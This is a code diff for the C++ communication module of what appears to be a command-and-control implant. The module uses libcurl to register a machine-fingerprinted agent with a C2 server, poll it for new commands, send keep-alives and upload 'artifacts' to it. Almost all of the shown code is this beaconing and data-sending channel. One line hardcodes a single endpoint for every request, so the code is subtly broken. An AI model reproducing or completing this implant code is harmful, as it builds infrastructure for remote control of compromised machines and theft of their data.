@@ -3,25 +3,24 @@
 #include <iostream>
 #include <string>
 #include <mutex>
-//#include "../include/curl"
+#include "../include/curl/curl.h"
 #include "../include/json.hpp"
 #include "../Utils/CryptoUtils.h"
 #include "../Utils/MachineUtils.h"
 
 using json = nlohmann::json;
 
-
 #define C2_HOST "http://127.0.0.1:1234"
 #define REGISTER_URI C2_HOST"/c2/register"
 #define CHECK_NEW_CMD_URI C2_HOST"/c2/new_command"
-#define KEEP_ALIVE_URI C2_HOST"/c2/ping"
+#define KEEP_ALIVE_URI C2_HOST"/c2/keep_alive"
 #define SEND_ARTIFACT C2_HOST"/c2/send_artifact"
 
 class Communicator
 {
 private:
     std::string client_id;
-    // CURL * curl;
+    CURL * curl;
     std::mutex curl_mtx;
 
     static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
@@ -29,19 +28,37 @@ private:
         return size * nmemb;
     }
 
-    bool send_request_safe(std::string uri, const json & payload, json * response_ptr, bool post=true)
+    bool send_request_safe(std::string uri, json payload, json * response_ptr, bool post=true)
     {
-        /*std::lock_guard<std::mutex> lock(curl_mtx);
-        std::string response_buf
+        std::lock_guard<std::mutex> lock(curl_mtx);
+
+        std::cout << "Sending request to " << uri << std::endl; 
+        std::cout << "Payload: " << payload.dump() << std::endl;
+
+        std::string response_buf;
         long resp_code;
         curl = curl_easy_init();
-        
-        curl_easy_setopt(curl, CURLOPT_URL, url);
+        struct curl_slist *headers = NULL;
+        CURLcode res;
+
+        /* Each message should have a client identifier */
+        if(!(payload.contains("client_id")))
+        {
+            payload["client_id"] = client_id;    
+            std::cout << "client id: " << payload["client_id"] << std::endl;
+        }
+
+        std::cout << "client id: " << payload["client_id"] << std::endl;
+
+        /* We always set the Content-Type to be json*/
+        headers = curl_slist_append(headers, "Content-Type: application/json");
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+
+        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:1234/c2/register/");
         if (post)
         {
             curl_easy_setopt(curl, CURLOPT_POST, 1L);
-            curl_slist_append(headers, "Content-Type: application/json");
-            if(payload)
+            if(!payload.empty())
             {
                 curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.dump().c_str());
             }
@@ -60,9 +77,10 @@ private:
         {
             char * content_type;
             res = curl_easy_getinfo(curl, CURLINFO_CONTENT_TYPE, &content_type);
-            if ((res == CURLE_OK) && content_type && std::string(content_type).find("application/json") != std::string::npos)  
+            if ((res == CURLE_OK) && content_type && std::string(content_type).find("application/json") != std::string::npos && response_ptr)  
             {
-                response_ptr->parse(response_buf);
+                /* If the server sent us some json - Such as a new command */
+                *response_ptr = json::parse(response_buf);
             }
             else
             {
@@ -71,31 +89,22 @@ private:
         }
         else
         {
-            std::cerr << "Unsuccessfull HTTP Response Code" << std::endl;
+            std::cerr << "Unsuccessfull HTTP Response Code" << resp_code << std::endl;
         }
 
+        curl_slist_free_all(headers);
         curl_easy_cleanup(curl);
 
-        return response_buf.size() || resp_code == 200;
-        
-        */
-
-       return true;
+        return resp_code == 200;
     }
     
     void keep_alive()
     {
-        json payload_client_id;
-        json response;
-        payload_client_id["client_id"] = client_id;
-        send_request_safe(KEEP_ALIVE_URI, payload_client_id, &response);
+        send_request_safe(KEEP_ALIVE_URI, NULL, NULL);
     }
 
     Communicator() {
-        if (!init())
-        {
-            throw std::runtime_error("Can't init communicator");
-        }
+        init();
     }
 
     void generate_agent_id()
@@ -107,11 +116,13 @@ private:
         client_id = CryptoUtils::md5(ss.str());
     }
 
-    bool init()
+    void init()
     {
         generate_agent_id();
-        return true;//curl_global_init(CURL_GLOBAL_DEFAULT);
-
+        if(curl_global_init(CURL_GLOBAL_DEFAULT) != CURLE_OK)
+        {
+            throw std::runtime_error("Can't init libcurl. Aborting !");
+        }
     }
 
 public:
@@ -125,12 +136,15 @@ public:
     Communicator& operator=(const Communicator&) = delete;
 
     ~Communicator() {
-        // curl_easy_cleanup();
-        // curl_global_cleanup();
+        curl_global_cleanup();
     }
 
     bool check_new_command(json * cmd)
     {
+        /* 
+        We send on payload to the server in this case. 
+        We only expect a response payload from the server. 
+        */
         return send_request_safe(CHECK_NEW_CMD_URI, NULL, cmd);
     }
 
@@ -139,10 +153,11 @@ public:
         json response;
         json registration_payload;
         registration_payload["client_id"] = client_id;
-        return send_request_safe(CHECK_NEW_CMD_URI, registration_payload, &response) || response["status"] == 0;
+
+        return send_request_safe(REGISTER_URI, registration_payload, &response) && response.contains("status") && response["status"] == "ok";
     }
 
-    void send_artifact(const json & payload)
+    void send_artifact(json payload)
     {
         json response;
         send_request_safe(SEND_ARTIFACT, payload, &response);
